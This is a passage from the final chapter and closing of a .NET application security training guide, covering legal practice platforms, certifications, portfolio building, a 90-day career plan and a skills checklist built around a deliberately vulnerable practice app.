5. **The full-circle moment**: point ZAP at the *unhardened* versions of endpoints you still have from earlier chapters (the vulnerable search, if you kept a copy) and watch the tools confirm what your hands already proved. Tools accelerate the fluent; they cannot replace them. (Same session, professional habit: `Reports → Export` — practice assembling the Ch. 21 report shape around ZAP output.)

### 22.4 Where to Practice (Legally — the Non-Negotiable Rule)

- **PortSwigger Web Security Academy** — free, the best structured web-security curriculum in existence; labs for every injection class in Part IV, plus advanced JWT/OAuth series that extend Chapters 8-9. Do one topic-track per week.
- **OWASP projects**: **WebGoat** (deliberately vulnerable Java, lessons baked in), **Juice Shop** (Node, a gamified finding hunt — its admin panel is a rite of passage), **DVWA** (classic PHP).
- **DVTA / OWASP .NET Goat-style targets & `vulhub`-style .NET labs** — for .NET-specific practice, your own SecureShop *is* one: keep a "vulnerable" branch of it as your personal test target, and re-run ZAP on it whenever you learn a new attack.
- **CTFs** (OverTheWire bandit for Linux basics, picoCTF, national CTFs) — timed problem-solving under pressure.
- **Bug bounty platforms** (HackerOne, Bugcrowd — after you've cleared the academies): read the scope, respect it, and remember the rule that defines the profession: **you attack what you own or have written permission to test — nothing else, ever.**

### 22.5 The Certification Ladder (Market-Mapped)

| Stage | Certification | What it signals | When |
|---|---|---|---|
| 1 — Foundations | **CompTIA Security+** | Baseline security vocabulary, industry-recognized HR filter | Before/alongside first applications |
| 1.5 — .NET depth | Your SecureShop portfolio + write-ups | Real proof of the exact skill in this guide's title | **Always ready** |
| 2 — AppSec professional | **(ISC)² CSSLP** | Secure SDLC end-to-end — threat modeling (Ch. 20), review (Ch. 21), testing (Ch. 22): your job description, certified | First security role / seeking it |
| 2 — Practical testing | **GIAC GWAPT / GWEB** (or INE eWPTX) | Hands-on web attack-and-report competence | If you're pentest-leaning |
| 3 — Advanced | **OSCP** / specialized (OSEP-class) | Deep offensive skill, exploit development | Optional, later, if red-team-pulling |

CV reality check: certifications get interviews; **the portfolio gets the job**. Which is why the next section is the one that matters.

### 22.6 The Portfolio: Turning SecureShop into a Job Offer

The project you built is a hire-ready artifact — *if* you finish it as a professional:

1. Push the final hardened version to GitHub — clean history, no secrets (rotate everything anyway — Ch. 17), README explaining the architecture.
2. Add a `docs/security/` folder containing: the **threat model** (Ch. 20's six-section deliverable), a professional **security review report** of the "vulnerable" branch (Ch. 21's format), and the **ZAP report + your triage notes**.
3. Write one short blog post: *"I built a deliberately vulnerable .NET shop, attacked it, and hardened it — here's what I learned"* — the single most persuasive artifact for a junior security hire.
4. Keep a `vulnerable/` branch — you now own a permanent, legal attack lab for every new technique you learn, forever.

### 22.7 Your 30/60/90-Day Plan

**Days 1-30 (consolidate):** re-run every `[LAB]` from memory where shaky; complete PortSwigger's SQLi + XSS + access-control tracks; run `dotnet list package --vulnerable` on everything you can legally touch; finish the threat-model document for SecureShop.
**Days 31-60 (go public):** the portfolio repo + write-up (22.6); ZAP reports + manual review on a friend's open-source .NET project (their permission, in writing); Security+ study track begins; contribute one real fix or advisory to an OSS .NET project (finding → PR is a *full-cycle* story).
**Days 61-90 (apply):** apply to junior application-security / security-analyst roles — emphasize SecureShop end-to-end; in interviews, *tell the story of findings* ("I found X in my own app via Y, and fixed it with Z per ASVS V-n") — stories beat adjectives. Keep one practice hour daily on the academies; consider a small bug-bounty engagement.

### 22.8 The Graduation Checklist

Every box is a chapter. You are a .NET application security analyst when you can do each **from memory**:

- [ ] Read raw HTTP fluently; explain 401 vs 403 and why cookies auto-attach (Ch. 2, 7)
- [ ] Explain CIA, risk = likelihood × impact, and attack surface (Ch. 3)
- [ ] Build PBKDF2 password storage; read a `PasswordHash` column's binary format (Ch. 5-6)
- [ ] Configure Identity's password/lockout policy and defend each option (Ch. 6)
- [ ] Explain what is inside the auth cookie and every `ConfigureApplicationCookie` flag (Ch. 7)
- [ ] Decode a JWT by hand; lock issuer/audience/lifetime/algorithms; explain the revocation trade (Ch. 8)
- [ ] Draw the authorization-code + PKCE flow and its attack surface (Ch. 9)
- [ ] Build a policy with requirement + handler; explain requirements-AND/handlers-OR (Ch. 10)
- [ ] Exploit and fix IDOR, mass assignment, and user-supplied identity (Ch. 11)
- [ ] Demonstrate SQL injection and fix it in EF Core, raw SQL, and Dapper (Ch. 12)
- [ ] Plant, exploit, and cure stored XSS; explain Razor encoding and `Html.Raw` (Ch. 13)
- [ ] Build an evil CSRF page and defend with tokens + SameSite; triage an API's exposure (Ch. 14)
- [ ] Recognize and fix SSRF, unsafe deserialization, open redirect, path traversal (Ch. 15)
- [ ] Harden an upload endpoint across all five attack classes (Ch. 16)
- [ ] Use the Data Protection API with purpose strings; do AES-GCM by hand; manage secrets (Ch. 17)
- [ ] Configure CORS correctly; explain every security header; rate-limit a login (Ch. 18)
- [ ] Build audit logging with correlation IDs; handle errors without leaks (Ch. 19)
- [ ] Produce a six-section STRIDE threat model with a gap register (Ch. 20)
- [ ] Run a grep-pack review and write evidenced, ASVS-cited findings (Ch. 21)
- [ ] Run ZAP, triage its output, and scan your dependencies (Ch. 22)

### 22.9 Recap

- Tools multiply the fluent: SCA in CI (`--vulnerable`), SAST analyzers on, DAST (ZAP) on every release — but verification and reporting remain yours.
- Practice legally and forever: academies first, CTFs, then bounties inside scope.
- Market path: Security+ for the filter, portfolio for the offer, CSSLP/GWEB as the role matures.
- The graduation checklist is the curriculum inverted into proof: if you can demonstrate each line, you are what the title of this guide promised.

**Next:** a short closing — where to go from here.
## Closing: Where to Go from Here

You started at "what is a web application." You are ending at the point where you can draw a system's trust boundaries, hash a password correctly by hand, break an IDOR in your sleep, read a `PasswordHash` column in binary, and hand a development team a report they'll actually act on — because every finding you'll ever write is now something you have personally built, broken, and fixed in your own code.

Three habits will keep the skill alive, because security is a practice, not a certificate:

**Keep attacking your own lab.** The `vulnerable` branch of SecureShop is a permanent, legal training range. Every new attack you read about — a fresh JWT confusion trick, a new deserialization gadget, an SSRF bypass — reproduce it there first. The day you can't be surprised by your own app is the day to find a harder one (the academies and Juice Shop are waiting).

**Stay current where the current actually flows.** Follow the .NET release notes and security advisories (every version ships new security APIs — rate limiting arrived in .NET 7, `IExceptionHandler` in .NET 8, BinaryFormatter's funeral completed in .NET 9; the platform keeps moving and so should you), the GitHub Advisory Database for your dependencies, and OWASP's updates to the Top 10 and ASVS. Re-run the Ch. 21 grep pack on your own projects monthly — muscle memory fades, greps don't.

**Write, review, and teach.** The analyst's compounding interest is articulation: the pull request that explains *why*, the blog post that walks through a finding, the review that cites the standard instead of the opinion. Every threat model, report, and checklist you produce makes the next one faster — and the field has a permanent shortage of people who can both find the problem and make engineers *want* to fix it.

You have the map, the muscle memory, the artifacts, and the method. The rest is practice — and it starts with the first `[LAB]` you choose to re-run tomorrow.
